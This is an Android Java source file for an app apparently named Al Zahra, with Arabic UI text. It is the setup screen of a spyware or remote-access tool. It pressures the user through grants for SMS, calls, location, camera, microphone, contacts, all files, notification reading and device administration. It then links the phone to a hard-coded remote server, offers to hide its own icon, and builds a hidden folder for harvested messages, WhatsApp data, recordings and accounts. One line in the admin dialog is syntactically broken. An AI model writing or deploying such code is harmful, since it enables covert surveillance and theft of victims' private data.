package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String TAG = "AlZahra";
    private static final int PERM_REQ = 1001;
    
    private SharedPreferences prefs;
    private Handler handler;
    private LinearLayout layout;
    private TextView statusText;
    private ProgressBar progressBar;
    private String serverUrl = "http://216.128.156.226:8443";
    
    // خطوات الصلاحيات
    private int currentStep = 0;
    private static final int TOTAL_STEPS = 10;
    
    // قائمة الصلاحيات المطلوبة
    private final String[][] PERMISSIONS = {
        // الخطوة 1: الهاتف والمكالمات
        {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.PROCESS_OUTGOING_CALLS
        },
        // الخطوة 2: الرسائل
        {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS
        },
        // الخطوة 3: الموقع
        {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        },
        // الخطوة 4: الكاميرا
        {
            Manifest.permission.CAMERA
        },
        // الخطوة 5: الميكروفون
        {
            Manifest.permission.RECORD_AUDIO
        },
        // الخطوة 6: جهات الاتصال
        {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS
        },
        // الخطوة 7: التخزين
        {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        }
    };
    
    private final String[] STEP_TITLES = {
        "صلاحيات الهاتف والمكالمات",
        "صلاحيات الرسائل",
        "صلاحيات الموقع",
        "صلاحيات الكاميرا",
        "صلاحيات الميكروفون",
        "صلاحيات جهات الاتصال",
        "صلاحيات التخزين"
    };
    
    private final String[] STEP_DESCRIPTIONS = {
        "مطلوبة لقراءة سجل المكالمات ومعلومات الهاتف",
        "مطلوبة لقراءة وإرسال الرسائل",
        "مطلوبة لتتبع موقع الجهاز",
        "مطلوبة لالتقاط الصور",
        "مطلوبة لتسجيل الصوت",
        "مطلوبة لقراءة جهات الاتصال",
        "مطلوبة لحفظ واسترجاع البيانات"
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        // إذا تم الإعداد سابقاً
        if (prefs.getBoolean("configured", false)) {
            startServiceAndHide();
            return;
        }
        
        setupUI();
        handler.postDelayed(this::processNextStep, 1000);
    }
    
    private void setupUI() {
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(0xFF1B5E20);
        
        // العنوان
        TextView title = new TextView(this);
        title.setText("🔐 إعداد التطبيق");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(26);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 20);
        layout.addView(title);
        
        // شريط التقدم
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(TOTAL_STEPS);
        progressBar.setProgress(0);
        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 20);
        pbParams.setMargins(0, 10, 0, 20);
        layout.addView(progressBar, pbParams);
        
        // نص الحالة
        statusText = new TextView(this);
        statusText.setTextColor(0xFFFFFFFF);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, 20, 0, 20);
        layout.addView(statusText);
        
        setContentView(layout);
    }
    
    private void updateStatus(String text) {
        runOnUiThread(() -> {
            statusText.setText(text);
            progressBar.setProgress(currentStep);
        });
    }
    
    // ═══════════════════════════════════════════
    // معالجة الخطوات
    // ═══════════════════════════════════════════
    
    private void processNextStep() {
        if (currentStep < PERMISSIONS.length) {
            // طلب صلاحيات
            requestPermissionStep(currentStep);
        } else if (currentStep == PERMISSIONS.length) {
            // طلب صلاحيات خاصة
            requestSpecialPermissions();
        } else if (currentStep == PERMISSIONS.length + 1) {
            // طلب صلاحية المسؤول
            requestAdminPermission();
        } else if (currentStep == PERMISSIONS.length + 2) {
            // شاشة الربط
            showLinkScreen();
        } else {
            // إنهاء الإعداد
            finishSetup();
        }
    }
    
    private void requestPermissionStep(int step) {
        String[] perms = PERMISSIONS[step];
        String title = STEP_TITLES[step];
        String desc = STEP_DESCRIPTIONS[step];
        
        // التحقق إذا كانت الصلاحيات ممنوحة
        boolean allGranted = true;
        for (String perm : perms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            currentStep++;
            processNextStep();
            return;
        }
        
        updateStatus(String.format("الخطوة %d/%d\n\n%s\n\n%s", 
            step + 1, TOTAL_STEPS, title, desc));
        
        // عرض رسالة توضيحية
        new AlertDialog.Builder(this)
            .setTitle("🔐 " + title)
            .setMessage(desc + "\n\nيرجى السماح للمتابعة")
            .setPositiveButton("السماح", (d, w) -> {
                ActivityCompat.requestPermissions(this, perms, PERM_REQ + step);
            })
            .setCancelable(false)
            .show();
    }
    
    private void requestSpecialPermissions() {
        updateStatus(String.format("الخطوة %d/%d\n\nصلاحيات خاصة", 
            PERMISSIONS.length + 1, TOTAL_STEPS));
        
        // التحقق من صلاحية التخزين الكامل (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                new AlertDialog.Builder(this)
                    .setTitle("🔐 صلاحية التخزين الكامل")
                    .setMessage("مطلوبة للوصول لجميع الملفات")
                    .setPositiveButton("السماح", (d, w) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, 2001);
                        } catch (Exception e) {
                            startActivityForResult(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                                Uri.parse("package:" + getPackageName())), 2001);
                        }
                    })
                    .setCancelable(false)
                    .show();
                return;
            }
        }
        
        // التحقق من الإشعارات
        if (!isNotificationEnabled()) {
            new AlertDialog.Builder(this)
                .setTitle("🔐 الوصول للإشعارات")
                .setMessage("مطلوب لقراءة إشعارات التطبيقات")
                .setPositiveButton("السماح", (d, w) -> {
                    startActivityForResult(
                        new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2002);
                })
                .setCancelable(false)
                .show();
            return;
        }
        
        // التحقق من الظهور فوق التطبيقات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                .setTitle("🔐 الظهور فوق التطبيقات")
                .setMessage("مطلوب للعمل في الخلفية")
                .setPositiveButton("السماح", (d, w) -> {
                    startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())), 2003);
                })
                .setCancelable(false)
                .show();
            return;
        }
        
        // التحقق من البطارية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                new AlertDialog.Builder(this)
                    .setTitle("🔐 تجاهل تحسين البطارية")
                    .setMessage("مطلوب للعمل المستمر")
                    .setPositiveButton("السماح", (d, w) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, 2004);
                        } catch (Exception e) {
                            currentStep++;
                            processNextStep();
                        }
                    })
                    .setCancelable(false)
                    .show();
                return;
            }
        }
        
        // كل الصلاحيات الخاصة ممنوحة
        currentStep++;
        processNextStep();
    }
    
    private void requestAdminPermission() {
        updateStatus(String.format("الخطوة %d/%d\n\nصلاحية المسؤول", 
            PERMISSIONS.length + 2, TOTAL_STEPS));
        
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        
        if (dpm != null && dpm.isAdminActive(admin)) {
            currentStep++;
            processNextStep();
            return;
        }
        
        new AlertDialog.Builder(this)
            .setTitle("🔐 صلاحية المسؤول")
            .setMessage("مطلوبة لحماية التطبيق من الحذف")
            .setPositiveButton("السماح", (d, w) -> {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    "هذه الصلاحية مطلوبة لحماية التطبيق");
                startActivityForResult(intent, 2005);
            })
            .setCancelable(false)
            .show();
    }
    
    // ═══════════════════════════════════════════
    // شاشة الربط
    // ═══════════════════════════════════════════
    
    private void showLinkScreen() {
        runOnUiThread(() -> {
            layout.removeAllViews();
            
            TextView title = new TextView(this);
            title.setText("🔗 ربط الجهاز");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(24);
            title.setGravity(Gravity.CENTER);
            title.setPadding(0, 0, 0, 20);
            layout.addView(title);
            
            TextView info = new TextView(this);
            info.setText("1. افتح البوت\n2. أرسل /link\n3. أدخل الكود");
            info.setTextColor(0xFFBBBBBB);
            info.setTextSize(16);
            info.setGravity(Gravity.CENTER);
            info.setPadding(0, 0, 0, 30);
            layout.addView(info);
            
            EditText input = new EditText(this);
            input.setHint("أدخل الكود هنا");
            input.setTextSize(22);
            input.setGravity(Gravity.CENTER);
            input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
            input.setId(100);
            layout.addView(input);
            
            TextView status = new TextView(this);
            status.setText("");
            status.setTextSize(14);
            status.setGravity(Gravity.CENTER);
            status.setPadding(0, 15, 0, 15);
            status.setId(101);
            layout.addView(status);
            
            Button btn = new Button(this);
            btn.setText("🔗 ربط");
            btn.setTextSize(18);
            btn.setOnClickListener(v -> {
                String code = input.getText().toString().trim();
                if (code.length() != 9) {
                    status.setText("❌ الكود 9 أرقام");
                    status.setTextColor(0xFFFF5252);
                    return;
                }
                btn.setEnabled(false);
                status.setText("⏳ جاري التحقق...");
                status.setTextColor(0xFFFFAB40);
                verifyCode(code, status, btn);
            });
            layout.addView(btn);
        });
    }
    
    private void verifyCode(String code, TextView status, Button btn) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/verify_code");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                String deviceId = getAlzahraDeviceId();
                String json = String.format("{\"code\":\"%s\",\"device_id\":\"%s\",\"model\":\"%s\",\"android\":\"%s\"}",
                    code, deviceId, Build.MODEL, Build.VERSION.RELEASE);
                
                conn.getOutputStream().write(json.getBytes());
                
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    
                    org.json.JSONObject resp = new org.json.JSONObject(sb.toString());
                    if ("ok".equals(resp.optString("status"))) {
                        prefs.edit()
                            .putBoolean("linked", true)
                            .putString("device_id", deviceId)
                            .apply();
                        
                        runOnUiThread(() -> {
                            status.setText("✅ تم الربط!");
                            status.setTextColor(0xFF69F0AE);
                            showHideDialog();
                        });
                    } else {
                        runOnUiThread(() -> {
                            status.setText("❌ " + resp.optString("message", "كود غير صحيح"));
                            status.setTextColor(0xFFFF5252);
                            btn.setEnabled(true);
                        });
                    }
                } else {
                    runOnUiThread(() -> {
                        status.setText("❌ خطأ في السيرفر");
                        status.setTextColor(0xFFFF5252);
                        btn.setEnabled(true);
                    });
                }
                conn.disconnect();
            } catch (Exception e) {
                runOnUiThread(() -> {
                    status.setText("❌ فشل الاتصال: " + e.getMessage());
                    status.setTextColor(0xFFFF5252);
                    btn.setEnabled(true);
                });
            }
        }).start();
    }
    
    private void showHideDialog() {
        new AlertDialog.Builder(this)
            .setTitle("✅ تم الربط بنجاح!")
            .setMessage("هل تريد إخفاء التطبيق؟")
            .setPositiveButton("نعم، إخفاء", (d, w) -> {
                hideAppIcon();
                currentStep++;
                processNextStep();
            })
            .setNegativeButton("لا", (d, w) -> {
                currentStep++;
                processNextStep();
            })
            .setCancelable(false)
            .show();
    }
    
    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, "com.alzahra.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.e(TAG, "Hide error", e);
        }
    }
    
    private void finishSetup() {
        updateStatus("✅ تم الإعداد بنجاح!");
        
        prefs.edit()
            .putBoolean("configured", true)
            .putLong("setup_time", System.currentTimeMillis())
            .apply();
        
        createSecretFolder();
        
        handler.postDelayed(this::startServiceAndHide, 1000);
    }
    
    private void createSecretFolder() {
        try {
            File dir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                dir = new File(getExternalFilesDir(null), ".sys_cache");
            } else {
                dir = new File(Environment.getExternalStorageDirectory(), ".sys_cache");
            }
            
            if (!dir.exists()) dir.mkdirs();
            
            String[] subs = {
                "sms", "calls", "notifications", "whatsapp", "messenger", 
                "recordings", "contacts", "location", "camera", "temp", 
                "backups", "app_data", "photos", "videos", "audio", 
                "documents", "downloads", "browser", "accounts", "system"
            };
            for (String s : subs) {
                File sub = new File(dir, s);
                if (!sub.exists()) sub.mkdirs();
            }
            
            File nomedia = new File(dir, ".nomedia");
            if (!nomedia.exists()) nomedia.createNewFile();
            
            prefs.edit().putString("secret_path", dir.getAbsolutePath()).apply();
            
        } catch (Exception e) {
            Log.e(TAG, "Folder error", e);
        }
    }
    
    private void startServiceAndHide() {
        try {
            Intent i = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception e) {
            Log.e(TAG, "Service error", e);
        }
        finishAffinity();
    }
    
    private boolean isNotificationEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
    
    private String getAlzahraDeviceId() {
        String id = prefs.getString("device_id", "");
        if (id.isEmpty()) {
            id = java.util.UUID.randomUUID().toString().substring(0, 8);
            prefs.edit().putString("device_id", id).apply();
        }
        return id;
    }
    
    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        
        if (code >= PERM_REQ && code < PERM_REQ + PERMISSIONS.length) {
            int step = code - PERM_REQ;
            
            boolean allGranted = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                currentStep = step + 1;
                processNextStep();
            } else {
                // إعادة طلب الصلاحية
                new AlertDialog.Builder(this)
                    .setTitle("⚠️ صلاحية مطلوبة")
                    .setMessage("يرجى السماح للمتابعة")
                    .setPositiveButton("إعادة", (d, w) -> processNextStep())
                    .setNegativeButton("تخطي", (d, w) -> {
                        currentStep++;
                        processNextStep();
                    })
                    .setCancelable(false)
                    .show();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        
        boolean success = false;
        
        switch (code) {
            case 2001: // التخزين الكامل
                success = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager();
                break;
            case 2002: // الإشعارات
                success = isNotificationEnabled();
                break;
            case 2003: // الظهور فوق التطبيقات
                success = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
                break;
            case 2004: // البطارية
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                success = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
                break;
            case 2005: // المسؤول
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(this, AdminReceiver.class);
                success = dpm != null && dpm.isAdminActive(admin);
                break;
            default:
                success = true;
        }
        
        if (success) {
            currentStep++;
            processNextStep();
        } else {
            new AlertDialog.Builder(this)
                .setTitle("⚠️ لم يتم التفعيل")
                .setMessage("يرجى التفعيل للمتابعة")
                .setPositiveButton("إعادة", (d, w) -> processNextStep())
                .setNegativeButton("تخطي", (d, w) -> {
                    currentStep++;
                    processNextStep();
                })
                .setCancelable(false)
                .show();
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacksAndMessages(null);
    }
}
